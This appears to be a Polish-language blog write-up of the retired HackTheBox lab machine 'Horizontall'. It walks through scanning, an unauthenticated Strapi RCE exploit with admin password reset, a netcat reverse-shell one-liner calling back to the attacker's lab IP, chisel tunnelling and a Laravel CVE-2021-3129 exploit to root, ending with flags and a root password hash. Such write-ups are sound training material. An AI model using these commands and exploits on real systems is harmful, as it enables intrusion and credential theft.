<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Horizontall - HackTheBox | Lavatann</title>
<meta name="keywords" content="Linux, Easy, Retired" />
<meta name="description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)">
<meta name="author" content="Mateusz Suszczyk">
<link rel="canonical" href="https://lavatann.github.io/posts/hackthebox/horizontall/" />
<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://lavatann.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://lavatann.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://lavatann.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://lavatann.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://lavatann.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.92.2" />
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Horizontall - HackTheBox" />
<meta property="og:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/horizontall/" />
<meta property="og:image" content="https://lavatann.github.io/thumbnails/Horizontall.jpg" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-02-04T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-02-04T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Horizontall.jpg" />
<meta name="twitter:title" content="Horizontall - HackTheBox"/>
<meta name="twitter:description" content="Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup&rsquo;em :)"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Posts",
      "item": "https://lavatann.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Horizontall - HackTheBox",
      "item": "https://lavatann.github.io/posts/hackthebox/horizontall/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Horizontall - HackTheBox",
  "name": "Horizontall - HackTheBox",
  "description": "Ta maszyna ma obecnie status wycofany na HackTheBox. Ciesz się writeup\u0026rsquo;em :)",
  "keywords": [
    "Linux", "Easy", "Retired"
  ],
  "articleBody": "Horizontall - 04.02.2022  NMap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -T4 -p- 10.10.11.105 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 13:22 CET Warning: 10.10.11.105 giving up on port because retransmission cap hit (6). Nmap scan report for horizontall.htb (10.10.11.105) Host is up (0.053s latency). Not shown: 65512 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: horizontall 1881/tcp filtered ibm-mqseries2 2719/tcp filtered scan-change 4321/tcp filtered rwhois 9962/tcp filtered unknown 18051/tcp filtered unknown 18054/tcp filtered unknown 24679/tcp filtered unknown 24965/tcp filtered unknown 29291/tcp filtered unknown 30648/tcp filtered unknown 34019/tcp filtered unknown 36738/tcp filtered unknown 38192/tcp filtered unknown 44503/tcp filtered unknown 47815/tcp filtered unknown 51521/tcp filtered unknown 52849/tcp filtered unknown 53575/tcp filtered unknown 63151/tcp filtered unknown 63315/tcp filtered unknown 64564/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  FeroxBuster 301 7l 13w 194c http://horizontall.htb/css 200 1l 35w 4286c http://horizontall.htb/favicon.ico 301 7l 13w 194c http://horizontall.htb/img 200 1l 43w 901c http://horizontall.htb/index.html 301 7l 13w 194c http://horizontall.htb/js [####################] - 35s 18788/18788 0s found:5 errors:0  [####################] - 23s 4697/4697 196/s http://horizontall.htb [####################] - 28s 4697/4697 163/s http://horizontall.htb/css [####################] - 28s 4697/4697 163/s http://horizontall.htb/img [####################] - 28s 4697/4697 167/s http://horizontall.htb/js  Strona główna Ngix 1.14.0\n Wykonałem głębszą enumerację i znalazłem subdomenę http://api-prod.horizontall.htb.\nW kodzie źródłowym nie ma nic ciekawego. Natomiast ciekawe rekordy wyrzucił FeroxBuster\n200 16l 101w 854c http://api-prod.horizontall.htb/Admin 200 0l 0w 7001634c http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js 200 223l 1051w 9230c http://api-prod.horizontall.htb/admin/runtime~main.d078dc17.js 200 16l 101w 854c http://api-prod.horizontall.htb/ADMIN 200 16l 101w 854c http://api-prod.horizontall.htb/admin 200 1l 7w 1150c http://api-prod.horizontall.htb/favicon.ico 200 19l 33w 413c http://api-prod.horizontall.htb/index.html 200 1l 21w 507c http://api-prod.horizontall.htb/reviews 200 3l 21w 121c http://api-prod.horizontall.htb/robots.txt 403 1l 1w 60c http://api-prod.horizontall.htb/users 200 19l 33w 413c http://api-prod.horizontall.htb/ 403 1l 1w 60c http://api-prod.horizontall.htb/Users 200 1l 21w 507c http://api-prod.horizontall.htb/Reviews 200 16l 101w 854c http://api-prod.horizontall.htb/AdMin 200 16l 101w 854c http://api-prod.horizontall.htb/admiN  reviews:\n robots.txt nie zawiera nic ciekawego. Pod admin dostajemy panel logowania do Strapi\nTutaj kod źródłowy jest już ciekawszy.\ndoctype html html lang=\"en\" head  The first thing in any HTML file should be the charset -- meta charset=\"utf-8\"  Make the page mobile compatible -- meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" meta name=\"mobile-web-app-capable\" content=\"yes\" titleStrapi Admintitle head body  The app hooks into this div -- div id=\"app\"div  A lot of magic happens in this file. HtmlWebpackPlugin automatically includes all assets (e.g. bundle.js, main.css) with the correct HTML tags, which is why they are missing in this HTML file. Don't add any assets here! (Check out webpackconfig.js if you want to know more) -- script type=\"text/javascript\" src=\"/admin/runtime~main.d078dc17.js\"scriptscript type=\"text/javascript\" src=\"/admin/main.da91597e.chunk.js\"scriptbody html Powyżej jest wspomniane o phpwebpackconfig.js, ale szybkim sprawdzeniu nie ma takiego pliku. Natomiast sprawdziłem, że Strapi generalnie ma taki plik, tylko nazywa się webpack.config.js. Zawiera on m.in informacje o wersji Strapi. Nie wiem czy to celowy zabieg czy nie, czy też może robię coś nie tak.\n Searchsploit ┌──(kali㉿kali)-[~/htb/horizontall] └─$ searchsploit strapi ------------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------------ --------------------------------- Strapi 3.0.0-beta - Set Password (Unauthenticated) | multiple/webapps/50237.py Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated) | multiple/webapps/50238.py Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py ------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results Papers: No Results Nie mam innego punktu zaczepienia niż sprawdzić chociaż ostatni exploit. Pierwszy odpada, bo nie znam maila potrzebnego do działania exploitu.\n Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) ┌──(kali㉿kali)-[~/htb/horizontall] └─$ python3 50239.py http://api-prod.horizontall.htb/ [+] Checking Strapi CMS Version running [+] Seems like the exploit will work!!! [+] Executing exploit [+] Password reset was successfully [+] Your email is: admin@horizontall.htb [+] Your new credentials are: admin:SuperStrongPassword1 [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzODg2MzIwLCJleHAiOjE2NDY0NzgzMjB9.6dNeTvgIJZ-r-ABsotdJX1zNvvY-9mxaK0NPRs-p4QU Super, admin@horizontall.htb:SuperStrongPassword1\nStrapi v3.0.0-beta.17.4\n Reverse shell W naszym exploicie nie widać odpowiedzi na komendy, natomiast wykonuje on komendy, dowodem jest nasłuchiwanie pingów na mojej maszynie, pokazane poniżej\n$ ping 10.10.14.224 Zatem możemy stworzyć połączenie\n$ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc 10.10.14.224 9010 /tmp/f [+] Triggering Remote code executin [*] Rember this is a blind RCE don't expect to see output user.txt 9574577aa60e3a61978c0ad62bff2256\n Privilege Escalation Sprawdziłem maszynę skryptem Linpeas, ale nie znalazłem na pierwszy rzut oka ciekawych scieżek. Dlatego spróbowałem również innym skryptem - Linux Exploit Suggester, który wskazał jedną z podatności.\n[+] [CVE-2018-18955] subuid_shell Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712 Exposure: probable Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28} Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip Comments: CONFIG_USER_NS needs to be enabled Jeżeli jeżeli chodzi o distro, to faktycznie jest to Ubuntu 18.04\ncat /etc/os-release NAME=\"Ubuntu\" VERSION=\"18.04.5 LTS (Bionic Beaver)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 18.04.5 LTS\" VERSION_ID=\"18.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=bionic UBUNTU_CODENAME=bionic strapi@horizontall:/tmp/p$ Dlatego postanowiłem spróbować tego exploita.\nhttps://github.com/scheatkode/CVE-2018-18955\nsubuid_shell jest priorytetem, dlatego jego zuploudowałem jako pierwszego. A poniżej wykonanie tego exploita\n./subuid_shell [.] starting [.] setting up namespace [~] done, namespace sandbox set up [.] mapping subordinate ids [.] subuid: 231072 [.] subgid: 231072 [~] done, mapped subordinate ids [.] executing subshell whoami whoami root root@horizontall:/tmp/p# :)\nOkazało się, że jednak w ten sposób nie mogę dokonać eskalacji uprawnień. W teorii mam roota, ale wszystkie pliki mają właścicieli nouser i nogroup. Exploit nie działa, albo twórca tej maszyny sprawił, że ten exploit nie działa :)\nMuszę znaleźć inny sposób.\n Netstat (netstat -punta || ss --ntpu) | grep \"127.0\" [144/144] tcp 0 0 127.0.0.1:8000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:1337 0.0.0.0:* LISTEN 1878/node /usr/bin/ Pod portem 1337 mamy API, pod 3306 jest MySQL a pod 8000 jest Laravel v8 (PHP v7.4.18). Nie znalazłem nic ciekawego pod kątem bezpośrednich exploitów dlatego stworzyłem połączenie poprzez chisel.\n Chisel Nasłuchuję u mnie\nchisel server --reverse -p 8001 Tworzę połączenie na maszynie HTB\n./chisel.1 client 10.10.14.224:8001 R:7000:127.0.0.1:8000 W Laravelu pierwsze co warto sprawdzić to czy jest włączony tryb debugowania poprzez dodanie /profiles do linku.\nJak widać w tym przypadku jest, mogę podejrzeć zatem dokładną wersje Laravela.\nPo wpisaniu wersji PHP i Laravela w Google otrzymałem jako pierwszy wynik CVE-2021-3129.\nCoś jednak nie działo,znalazłem na Githubie innego exploita na tą podatność:\nhttps://github.com/nth347/CVE-2021-3129_exploit\n┌──(kali㉿kali)-[~/htb/horizontall/CVE-2021-3129_exploit] └─$ ./exploit.py http://localhost:7000 Monolog/RCE1 \"id\" [i] Trying to clear logs [+] Logs cleared [+] PHPGGC found. Generating payload and deploy it to the target [+] Successfully converted logs to PHAR [+] PHAR deserialized. Exploited uid=0(root) gid=0(root) groups=0(root) [i] Trying to clear logs [+] Logs cleared Próba wyświetlenia flagi:\n┌──(kali㉿kali)-[~/htb/horizontall/CVE-2021-3129_exploit] └─$ ./exploit.py http://localhost:7000 Monolog/RCE1 \"cat /root/root.txt\" [i] Trying to clear logs [+] Logs cleared [+] PHPGGC found. Generating payload and deploy it to the target [+] Successfully converted logs to PHAR [+] PHAR deserialized. Exploited fee3519f7a12a76751d87c80ecdeb288 [i] Trying to clear logs [+] Logs cleared root.txt\nfee3519f7a12a76751d87c80ecdeb288\n/etc/shadow - root root:$6$rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7:::\n",
  "wordCount" : "1077",
  "inLanguage": "en",
  "image":"https://lavatann.github.io/thumbnails/Horizontall.jpg","datePublished": "2022-02-04T00:00:00Z",
  "dateModified": "2022-02-04T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Mateusz Suszczyk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://lavatann.github.io/posts/hackthebox/horizontall/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Lavatann",
    "logo": {
      "@type": "ImageObject",
      "url": "https://lavatann.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://lavatann.github.io" accesskey="h" title="Lavatann (Alt + H)">Lavatann</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://lavatann.github.io/archives/" title="Archiwum">
                    <span>Archiwum</span>
                </a>
            </li>
            <li>
                <a href="https://lavatann.github.io/categories/" title="Kategorie">
                    <span>Kategorie</span>
                </a>
            </li>
            <li>
                <a href="https://lavatann.github.io/tags/" title="Tagi">
                    <span>Tagi</span>
                </a>
            </li>
            <li>
                <a href="https://lavatann.github.io/search/" title="Szukaj">
                    <span>Szukaj</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://lavatann.github.io">Home</a>&nbsp;»&nbsp;<a href="https://lavatann.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Horizontall - HackTheBox
    </h1>
    <div class="post-meta"><span title='2022-02-04 00:00:00 +0000 UTC'>February 4, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Mateusz Suszczyk

</div>
  </header> 
<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Horizontall.jpg" alt="">
        
</figure><div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#horizontall---04022022" aria-label="Horizontall - 04.02.2022">Horizontall - 04.02.2022</a></li>
                <li>
                    <a href="#nmap" aria-label="NMap">NMap</a></li>
                <li>
                    <a href="#feroxbuster" aria-label="FeroxBuster">FeroxBuster</a></li>
                <li>
                    <a href="#strona-g%c5%82%c3%b3wna" aria-label="Strona główna">Strona główna</a><ul>
                        
                <li>
                    <a href="#searchsploit" aria-label="Searchsploit">Searchsploit</a></li>
                <li>
                    <a href="#strapi-cms-300-beta174---remote-code-execution-rce-unauthenticated" aria-label="Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)">Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)</a></li>
                <li>
                    <a href="#reverse-shell" aria-label="Reverse shell">Reverse shell</a></li></ul>
                </li>
                <li>
                    <a href="#privilege-escalation" aria-label="Privilege Escalation">Privilege Escalation</a><ul>
                        
                <li>
                    <a href="#netstat" aria-label="Netstat">Netstat</a></li>
                <li>
                    <a href="#chisel" aria-label="Chisel">Chisel</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="horizontall---04022022">Horizontall - 04.02.2022<a hidden class="anchor" aria-hidden="true" href="#horizontall---04022022">#</a></h1>
<hr>
<h1 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>                                                                                                                                                                                                                         
└─$ nmap -sC -sV -T4 -p- 10.10.11.105                                                                                                                                                                                                       
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-11-12 13:22 CET                                                                                                                                                                             
Warning: 10.10.11.105 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>6<span style="color:#f92672">)</span>.                                                                                                                                                                 
Nmap scan report <span style="color:#66d9ef">for</span> horizontall.htb <span style="color:#f92672">(</span>10.10.11.105<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.053s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65512</span> closed ports
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:            
|   <span style="color:#ae81ff">2048</span> ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp    open     http          nginx 1.14.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-server-header: nginx/1.14.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: horizontall 
1881/tcp  filtered ibm-mqseries2
2719/tcp  filtered scan-change
4321/tcp  filtered rwhois
9962/tcp  filtered unknown
18051/tcp filtered unknown
18054/tcp filtered unknown
24679/tcp filtered unknown
24965/tcp filtered unknown
29291/tcp filtered unknown
30648/tcp filtered unknown
34019/tcp filtered unknown
36738/tcp filtered unknown
38192/tcp filtered unknown
44503/tcp filtered unknown
47815/tcp filtered unknown
51521/tcp filtered unknown
52849/tcp filtered unknown
53575/tcp filtered unknown
63151/tcp filtered unknown
63315/tcp filtered unknown
64564/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><hr>
<h1 id="feroxbuster">FeroxBuster<a hidden class="anchor" aria-hidden="true" href="#feroxbuster">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">301</span>        7l       13w      194c http://horizontall.htb/css
<span style="color:#ae81ff">200</span>        1l       35w     4286c http://horizontall.htb/favicon.ico
<span style="color:#ae81ff">301</span>        7l       13w      194c http://horizontall.htb/img
<span style="color:#ae81ff">200</span>        1l       43w      901c http://horizontall.htb/index.html
<span style="color:#ae81ff">301</span>        7l       13w      194c http://horizontall.htb/js
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 35s    18788/18788   0s      found:5       errors:0      </span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 23s     4697/4697    196/s   http://horizontall.htb</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 28s     4697/4697    163/s   http://horizontall.htb/css</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 28s     4697/4697    163/s   http://horizontall.htb/img</span>
<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 28s     4697/4697    167/s   http://horizontall.htb/js</span>
</code></pre></div><hr>
<h1 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h1>
<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020211112131459.png" alt=""  />
</p>
<p>Ngix 1.14.0</p>
<hr>
<p>Wykonałem głębszą enumerację i znalazłem subdomenę <code>http://api-prod.horizontall.htb</code>.</p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203114849.png" alt=""  />
</p>
<p>W kodzie źródłowym nie ma nic ciekawego. Natomiast ciekawe rekordy wyrzucił FeroxBuster</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">200</span>       16l      101w      854c http://api-prod.horizontall.htb/Admin
<span style="color:#ae81ff">200</span>        0l        0w  7001634c http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js
<span style="color:#ae81ff">200</span>      223l     1051w     9230c http://api-prod.horizontall.htb/admin/runtime~main.d078dc17.js
<span style="color:#ae81ff">200</span>       16l      101w      854c http://api-prod.horizontall.htb/ADMIN
<span style="color:#ae81ff">200</span>       16l      101w      854c http://api-prod.horizontall.htb/admin
<span style="color:#ae81ff">200</span>        1l        7w     1150c http://api-prod.horizontall.htb/favicon.ico
<span style="color:#ae81ff">200</span>       19l       33w      413c http://api-prod.horizontall.htb/index.html
<span style="color:#ae81ff">200</span>        1l       21w      507c http://api-prod.horizontall.htb/reviews
<span style="color:#ae81ff">200</span>        3l       21w      121c http://api-prod.horizontall.htb/robots.txt
<span style="color:#ae81ff">403</span>        1l        1w       60c http://api-prod.horizontall.htb/users
<span style="color:#ae81ff">200</span>       19l       33w      413c http://api-prod.horizontall.htb/
<span style="color:#ae81ff">403</span>        1l        1w       60c http://api-prod.horizontall.htb/Users
<span style="color:#ae81ff">200</span>        1l       21w      507c http://api-prod.horizontall.htb/Reviews
<span style="color:#ae81ff">200</span>       16l      101w      854c http://api-prod.horizontall.htb/AdMin
<span style="color:#ae81ff">200</span>       16l      101w      854c http://api-prod.horizontall.htb/admiN
</code></pre></div><hr>
<p>reviews:</p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203115941.png" alt=""  />
</p>
<hr>
<p>robots.txt nie zawiera nic ciekawego. Pod <code>admin</code> dostajemy panel logowania do <code>Strapi</code></p>
<p><img loading="lazy" src="static/screenshots/Pasted%20image%2020220203115134.png" alt=""  />
</p>
<p>Tutaj kod źródłowy jest już ciekawszy.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">doctype</span> <span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;!--</span> <span style="color:#a6e22e">The</span> <span style="color:#a6e22e">first</span> <span style="color:#a6e22e">thing</span> <span style="color:#a6e22e">in</span> <span style="color:#a6e22e">any</span> <span style="color:#a6e22e">HTML</span> <span style="color:#a6e22e">file</span> <span style="color:#a6e22e">should</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">charset</span> <span style="color:#f92672">--&gt;</span>
  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;!--</span> <span style="color:#a6e22e">Make</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">page</span> <span style="color:#a6e22e">mobile</span> <span style="color:#a6e22e">compatible</span> <span style="color:#f92672">--&gt;</span>
  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mobile-web-app-capable&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yes&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Strapi</span> <span style="color:#a6e22e">Admin</span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;!--</span> <span style="color:#a6e22e">The</span> <span style="color:#a6e22e">app</span> <span style="color:#a6e22e">hooks</span> <span style="color:#a6e22e">into</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">div</span> <span style="color:#f92672">--&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;app&#34;</span><span style="color:#f92672">&gt;&lt;/</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
